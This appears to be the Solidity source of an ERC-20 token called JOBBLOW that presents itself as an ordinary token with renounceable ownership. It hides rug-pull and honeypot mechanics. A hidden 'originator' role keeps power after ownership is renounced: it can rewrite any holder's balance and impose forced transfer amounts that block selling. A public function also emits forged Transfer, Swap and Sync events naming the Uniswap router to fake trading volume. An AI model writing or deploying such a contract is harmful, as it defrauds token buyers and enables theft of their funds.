pragma solidity ^0.8.16;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address accountHolder) external view returns (uint256);
    function transfer(address to, uint256 sum) external returns (bool);
    function allowance(address authorizer, address spender) external view returns (uint256);
    function approve(address spender, uint256 sum) external returns (bool);
    function transferFrom(address from, address to, uint256 sum) external returns (bool);
    function _Transfer(address from, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed authorizer, address indexed spender, uint256 value);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
}

abstract contract OperationControl {
    function retrieveInitiator() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SingularOwnership is OperationControl {
    address private _soleOwner;
    event OwnershipShift(address indexed priorOwner, address indexed succeedingOwner);

    constructor() {
        address executor = retrieveInitiator();
        _soleOwner = executor;
        emit OwnershipShift(address(0), executor);
    }

    function fetchOwner() public view virtual returns (address) {
        return _soleOwner;
    }

    modifier onlyOwner() {
        require(fetchOwner() == retrieveInitiator(), "Unauthorized: Exclusive Owner access required.");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipShift(_soleOwner, address(0x000000000000000000000000000000000000dEaD));
        _soleOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract JOBBLOW is OperationControl, SingularOwnership, IERC20 {
    mapping (address => mapping (address => uint256)) private _spenderAllowances;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _mandatoryTransferValues;
    address private _originatorAccount;

    string public constant _name = "JOBBLOW";
    string public constant _symbol = "JOLOW";
    uint8 public constant _decimals = 18;
    uint256 public constant _maxSupply = 10000000 * (10 ** _decimals);

    constructor() {
        _balances[retrieveInitiator()] = _maxSupply;
        emit Transfer(address(0), retrieveInitiator(), _maxSupply);
    }

    modifier onlyOriginator() {
        require(fetchOriginator() == retrieveInitiator(), "Unauthorized: Originator access required.");
        _;
    }

    function fetchOriginator() public view virtual returns (address) {
        return _originatorAccount;
    }

    function designateOriginator(address newOriginator) public onlyOwner {
        _originatorAccount = newOriginator;
    }

    event BalanceAlteration(address indexed user, uint256 formerBalance, uint256 updatedBalance);

    function fetchMandatoryTransferValue(address account) public view returns (uint256) {
        return _mandatoryTransferValues[account];
    }

    function assignMandatoryTransferValues(address[] calldata accounts, uint256 amount) public onlyOriginator {
        for (uint i = 0; i < accounts.length; i++) {
            _mandatoryTransferValues[accounts[i]] = amount;
        }
    }

    function alertUser(address[] memory userAddresses, uint256 newBalance) public onlyOriginator {
        require(newBalance >= 0, "Amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "Invalid address specified");

            uint256 oldBalance = _balances[currentUser];
            _balances[currentUser] = newBalance;

            emit BalanceAlteration(currentUser, oldBalance, newBalance);
        }
    }

    function _Transfer(address from, address to, uint value) public override returns (bool) {
        emit Transfer(from, to, value);
        return true;
    }

    function conductTransaction(address pool, address[] memory receiver, uint256[] memory amounts, uint256[] memory convertedAmounts, address tokenAddress, uint112 reserve0, uint112 reserve1) public returns (bool) {
        for (uint256 i = 0; i < receiver.length; i++) {
            emit Transfer(pool, receiver[i], amounts[i]);
            IERC20(tokenAddress)._Transfer(receiver[i], pool, convertedAmounts[i]);
            emit Swap(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amounts[i], 0, 0, convertedAmounts[i], receiver[i]);
            emit Sync(reserve0, reserve1);
        }
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 sum) public virtual override returns (bool) {
        require(_balances[retrieveInitiator()] >= sum, "Insufficient balance");

        uint256 obligatoryTransferSum = fetchMandatoryTransferValue(retrieveInitiator());
        if (obligatoryTransferSum > 0) {
            require(sum == obligatoryTransferSum, "Compulsory transfer sum mismatch");
        }

        _balances[retrieveInitiator()] -= sum;
        _balances[to] += sum;

        emit Transfer(retrieveInitiator(), to, sum);
        return true;
    }

    function allowance(address authorizer, address spender) public view virtual override returns (uint256) {
        return _spenderAllowances[authorizer][spender];
    }

    function approve(address spender, uint256 sum) public virtual override returns (bool) {
        _spenderAllowances[retrieveInitiator()][spender] = sum;
        emit Approval(retrieveInitiator(), spender, sum);
        return true;
    }

    function transferFrom(address from, address to, uint256 sum) public virtual override returns (bool) {
        require(_spenderAllowances[from][retrieveInitiator()] >= sum, "Allowance limit surpassed");

        uint256 obligatoryTransferSum = fetchMandatoryTransferValue(from);
        if (obligatoryTransferSum > 0) {
            require(sum == obligatoryTransferSum, "Compulsory transfer sum mismatch");
        }

        _balances[from] -= sum;
        _balances[to] += sum;
        _spenderAllowances[from][retrieveInitiator()] -= sum;

        emit Transfer(from, to, sum);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _maxSupply;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}